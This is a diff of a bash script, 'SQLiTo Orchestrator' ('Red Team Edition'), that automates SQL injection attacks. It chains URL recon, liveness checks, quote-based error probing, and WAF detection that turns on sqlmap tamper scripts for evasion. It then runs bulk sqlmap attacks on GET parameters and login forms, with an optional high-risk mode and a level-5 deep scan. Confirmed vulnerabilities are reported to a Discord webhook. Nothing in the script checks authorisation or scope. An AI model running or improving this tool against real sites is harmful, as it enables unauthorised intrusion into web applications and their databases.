@@ -1,11 +1,10 @@
 #!/bin/bash
 
 # ==============================================================================
-# TITLE: SQLiTo Orchestrator v6.3 (Async Red Team Edition)
+# TITLE: SQLiTo Orchestrator v6.4 (Stable Red Team Edition)
 # AUTHOR: ?
 # DESCRIPTION: Parallel Recon + Heuristic Filtering + POST/Form Auditing
 # ==============================================================================
-#!/bin/bash
 
 # --- CONFIGURATION ---
 WORKSPACE_DIR="sqlito_workspace"
@@ -16,8 +15,8 @@ DISCORD_WEBHOOK=""
 TEMP_RAW="recon_raw.tmp"
 TEMP_FILTERED="recon_filtered.tmp"
 ERROR_CANDIDATES="candidates_error.txt"
-LIVE_GET="live_targets_get.txt"     # URLs with ?id=1
-LIVE_POST="live_targets_forms.txt"  # URLs like /login
+LIVE_GET="live_targets_get.txt"      # URLs with ?id=1
+LIVE_POST="live_targets_forms.txt"   # URLs like /login
 SQLMAP_RESULTS="sqlmap_results.csv"
 
 # Regex Blacklists
@@ -42,13 +41,12 @@ NC='\033[0m'
 banner() {
     clear
     echo -e "${RED}${BOLD}"
-    echo "   _____ ____    __   _ ______          "
-    echo "  / ___// __ \  / /  (_) ____/___       "
-    echo "  \__ \/ / / / / /  / / /   / __ \      "
-    echo " ___/ / /_/ / / /__/ / /___/ /_/ /      "
-    echo "/____/\___\_\/_____/_/\____/\____/  v6.3"
+    echo "    _____ ____    __   _ ______           "
+    echo "   / ___// __ \  / /  (_) ____/___        "
+    echo "   \__ \/ / / / / /  / / /    / __ \       "
+    echo "  ___/ / /_/ / / /__/ / /___/ /_/ /       "
+    echo " /____/\___\_\/_____/_/\____/\____/  v6.4"
     echo -e "${NC}"
-    echo -e "    ${BLUE}:: GET Injection | POST Forms | Heuristics ::${NC}"
     echo "------------------------------------------------------------"
 }
 
@@ -62,20 +60,6 @@ notify() {
     if [ ! -z "$DISCORD_WEBHOOK" ]; then
         curl -H "Content-Type: application/json" -d "{\"content\": \"$msg\"}" $DISCORD_WEBHOOK > /dev/null 2>&1 &
     fi
-}
-
-spinner() {
-    local pid=$1
-    local delay=0.1
-    local spinstr='|/-\'
-    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-        local temp=${spinstr#?}
-        printf " [%c]  " "$spinstr"
-        local spinstr=$temp${spinstr%"$temp"}
-        sleep $delay
-        printf "\b\b\b\b\b\b"
-    done
-    printf "    \b\b\b\b"
 }
 
 setup_env() {
@@ -126,11 +110,29 @@ mode_selection() {
             MODE="IMPORT"
             read -p "Enter path to URL list file: " IMPORT_FILE
             if [ ! -f "$IMPORT_FILE" ]; then error "File not found: $IMPORT_FILE"; fi
+            
+            # Copiar al workspace para procesar
             cp "$IMPORT_FILE" "$WORKSPACE_DIR/$TEMP_RAW"
-            TARGET_DOMAIN="Imported-List"
-            BASE_URL=$(head -n 1 "$WORKSPACE_DIR/$TEMP_RAW" | grep -oE "^https?://[^/]+")
-            [ -z "$BASE_URL" ] && BASE_URL="http://unknown-target"
-            success "Loaded targets."
+            
+            # Lógica robusta para extraer el BASE_URL de un archivo mezclado
+            info "Analyzing import file to determine Base URL..."
+            FIRST_URL=$(head -n 1 "$WORKSPACE_DIR/$TEMP_RAW")
+            
+            # Usar httpx para resolver la redirección real y el protocolo
+            RESOLVED_BASE=$(echo "$FIRST_URL" | httpx -silent -timeout 3 -status-code -follow-redirects | awk '{print $1}')
+            
+            if [ ! -z "$RESOLVED_BASE" ]; then
+                BASE_URL="$RESOLVED_BASE"
+                # Extraer dominio limpio para reportes
+                TARGET_DOMAIN=$(echo "$BASE_URL" | awk -F/ '{print $3}')
+            else
+                # Fallback sucio si httpx falla totalmente
+                warn "Could not verify Base URL via network. Using first line entry."
+                TARGET_DOMAIN="imported-target"
+                BASE_URL="$FIRST_URL"
+            fi
+            
+            success "Targets loaded. Main Target inferred: $BASE_URL"
             ;;
         *) error "Invalid selection." ;;
     esac
@@ -140,7 +142,13 @@ waf_detection() {
     echo -e "\n${BOLD}WAF CONFIGURATION:${NC}"
     info "Running WAF detection on $BASE_URL..."
     
-    WAF_RESULT=$(wafw00f "$BASE_URL" -a | grep "is behind" | awk '{print $NF}')
+    # Validar que BASE_URL no esté vacía o sea inválida antes de lanzar wafw00f
+    if [[ "$BASE_URL" != http* ]]; then
+        warn "Invalid Base URL detected ($BASE_URL). Skipping WAF check."
+        WAF_RESULT=""
+    else
+        WAF_RESULT=$(wafw00f "$BASE_URL" -a | grep "is behind" | awk '{print $NF}')
+    fi
     
     if [ ! -z "$WAF_RESULT" ]; then
         warn "WAF Detected: $WAF_RESULT"
@@ -151,14 +159,12 @@ waf_detection() {
             *)              TAMPERS="randomcase,space2comment,equaltolike" ;;
         esac
         info "Auto-applied tamper scripts: $TAMPERS"
-        # If WAF is found, we stick to the safe defaults or user tuning
         EXTRA_LEVEL=1
         EXTRA_RISK=1
     else
         success "No WAF detected (or detection failed)."
         TAMPERS=""
         
-        # --- NEW INTERACTIVE PROMPT ---
         echo -e "${YELLOW}[?] No WAF found. Do you want to increase aggression?${NC}"
         echo -e "    ${CYAN}[1]${NC} Keep Safe (Level 1, Risk 1)"
         echo -e "    ${CYAN}[2]${NC} Go Hard (Level 3, Risk 2)"
@@ -223,17 +229,30 @@ active_crawler() {
 filtering_process() {
     info "Phase 2: Dual-Stream Filtering (GET + POST)"
     
+    # Pre-clean known garbage
     cat "$WORKSPACE_DIR/$TEMP_RAW" | grep -iEv "$EXT_BLACKLIST" > "$WORKSPACE_DIR/clean_base.tmp"
 
-    # Stream A: GET
+    # Stream A: GET Parameters
     cat "$WORKSPACE_DIR/clean_base.tmp" | grep '=' | grep -iEv "$PARAM_BLACKLIST" | uro > "$WORKSPACE_DIR/candidates_get.tmp"
     
-    # Stream B: POST
+    # Stream B: POST Forms
     cat "$WORKSPACE_DIR/clean_base.tmp" | grep -v '=' | grep -Ei "$FORM_KEYWORDS" | sort -u > "$WORKSPACE_DIR/candidates_forms.tmp"
 
-    info "Verifying Liveness..."
-    httpx -l "$WORKSPACE_DIR/candidates_get.tmp" -silent -mc 200 -threads 50 -timeout 5 | awk '{print $1}' > "$LIVE_GET"
-    httpx -l "$WORKSPACE_DIR/candidates_forms.tmp" -silent -mc 200 -threads 50 -timeout 5 | awk '{print $1}' > "$LIVE_POST"
+    info "Verifying Liveness (httpx)..."
+    
+    # Check GET candidates
+    if [ -s "$WORKSPACE_DIR/candidates_get.tmp" ]; then
+        httpx -l "$WORKSPACE_DIR/candidates_get.tmp" -silent -mc 200 -threads 50 -timeout 5 | awk '{print $1}' > "$LIVE_GET"
+    else
+        touch "$LIVE_GET"
+    fi
+
+    # Check POST candidates
+    if [ -s "$WORKSPACE_DIR/candidates_forms.tmp" ]; then
+        httpx -l "$WORKSPACE_DIR/candidates_forms.tmp" -silent -mc 200 -threads 50 -timeout 5 | awk '{print $1}' > "$LIVE_POST"
+    else
+        touch "$LIVE_POST"
+    fi
 
     GET_COUNT=$(wc -l < "$LIVE_GET")
     POST_COUNT=$(wc -l < "$LIVE_POST")
@@ -242,6 +261,12 @@ filtering_process() {
 
 heuristic_check() {
     info "Phase 3: Heuristic Error Check (GET)"
+    
+    if [ ! -s "$LIVE_GET" ]; then
+        warn "No GET parameters to check heuristically."
+        return
+    fi
+
     cat "$LIVE_GET" | qsreplace "'" | \
     httpx -silent -threads 20 \
     -match-string "syntax; error" \
@@ -263,53 +288,69 @@ heuristic_check() {
 attack_sequence() {
     echo -e "\n${RED}${BOLD}[!!!] Phase 4: SQLMap Orchestration [!!!]${NC}"
     
-    # If EXTRA_LEVEL is set (from WAF menu), use it. Otherwise default to 1.
     LVL=${EXTRA_LEVEL:-1}
     RSK=${EXTRA_RISK:-1}
     
     SQL_FLAGS="--threads=$SQL_THREADS --delay=$SQL_DELAY --random-agent --batch --parse-errors"
     [ ! -z "$TAMPERS" ] && SQL_FLAGS="$SQL_FLAGS --tamper=$TAMPERS"
 
-    # Clear previous results to avoid confusion
     rm -f "$SQLMAP_RESULTS"
 
     # 1. ATTACK GET
     if [ -s "$LIVE_GET" ]; then
         info "Step 1: Auditing GET Parameters (Level: $LVL | Risk: $RSK)"
         sqlmap -m "$LIVE_GET" $SQL_FLAGS --level=$LVL --risk=$RSK --technique=BEU --smart --skip-static --results-file="$SQLMAP_RESULTS"
+    else
+        warn "Skipping Step 1: No GET targets."
     fi
 
     # 2. ATTACK POST
     if [ -s "$LIVE_POST" ]; then
         echo -e "\n${MAGENTA}[+] Step 2: Auditing POST Forms${NC}"
-        # Forms need slightly higher level to find fields
         FORM_LVL=$((LVL < 2 ? 2 : LVL))
         sqlmap -m "$LIVE_POST" $SQL_FLAGS --forms --level=$FORM_LVL --risk=$RSK --smart --results-file="$SQLMAP_RESULTS"
+    else
+        warn "Skipping Step 2: No POST form targets."
     fi
 
-    # 3. DEEP SCAN
+    # 3. DEEP SCAN (Main Domain)
     echo -e "\n${MAGENTA}[+] Step 3: Deep Scan on Main Domain${NC}"
-    if [ "$MODE" == "IMPORT" ]; then MAIN_TARGET=$(head -n 1 "$LIVE_GET"); else MAIN_TARGET="$BASE_URL"; fi
     
-    # Always go max power on the main domain
-    sqlmap -u "$MAIN_TARGET" $SQL_FLAGS --forms --crawl=2 --level=5 --risk=2 --technique=BEUSTQ --banner --results-file="$SQLMAP_RESULTS"
+    # FAIL-SAFE SELECTION FOR MAIN TARGET
+    if [ "$MODE" == "IMPORT" ]; then
+        # Try to grab a valid URL from GET list
+        MAIN_TARGET=$(head -n 1 "$LIVE_GET")
+        # If empty, try POST list
+        [ -z "$MAIN_TARGET" ] && MAIN_TARGET=$(head -n 1 "$LIVE_POST")
+        # If still empty, use BASE_URL resolved earlier
+        [ -z "$MAIN_TARGET" ] && MAIN_TARGET="$BASE_URL"
+    else
+        MAIN_TARGET="$BASE_URL"
+    fi
+
+    if [ ! -z "$MAIN_TARGET" ] && [[ "$MAIN_TARGET" != http* ]]; then
+         # Last resort format check
+         MAIN_TARGET="http://$MAIN_TARGET"
+    fi
+
+    if [ ! -z "$MAIN_TARGET" ]; then
+        info "Deep scanning target: $MAIN_TARGET"
+        sqlmap -u "$MAIN_TARGET" $SQL_FLAGS --forms --crawl=2 --level=5 --risk=2 --technique=BEUSTQ --banner --results-file="$SQLMAP_RESULTS"
+    else
+        error "Could not determine a valid target for Deep Scan."
+    fi
         
-    # --- IMPROVED REPORTING ---
+    # --- REPORTING ---
     echo -e "\n${BLUE}[*] Analysis complete. Parsing results...${NC}"
     
     if [ -f "$SQLMAP_RESULTS" ]; then
-        # Check if file has more than 1 line (Header is line 1)
         LINE_COUNT=$(wc -l < "$SQLMAP_RESULTS")
         
         if [ "$LINE_COUNT" -gt "1" ]; then
             VULNS=$((LINE_COUNT - 1))
             echo -e "\n${GREEN}[$$$] SUCCESS! Found $VULNS confirmed vulnerabilities.${NC}"
             echo -e "${YELLOW}Vulnerable Endpoints:${NC}"
-            
-            # Print columns: URL (col 2), Parameter (col 4), Payload (col 12 - adjusts based on version)
-            # Adjust cut -d, based on your sqlmap version csv structure. usually standard is safe.
             cat "$SQLMAP_RESULTS" | grep -v "Target URL" | cut -d "," -f 2,4
-            
             notify "SQLiTo found $VULNS vulnerabilities on $TARGET_DOMAIN."
         else
             warn "Results file exists but contains no vulnerabilities."
@@ -329,8 +370,14 @@ performance_tuning
 if [ "$MODE" == "RECON" ]; then
     passive_recon
     active_crawler
+fi
+
+# CRITICAL FIX: Filtering MUST run for both Import and Recon modes
+if [ -s "$WORKSPACE_DIR/$TEMP_RAW" ]; then
     filtering_process
     heuristic_check
+else
+    error "Target list ($TEMP_RAW) is empty or missing. Aborting."
 fi
 
 attack_sequence
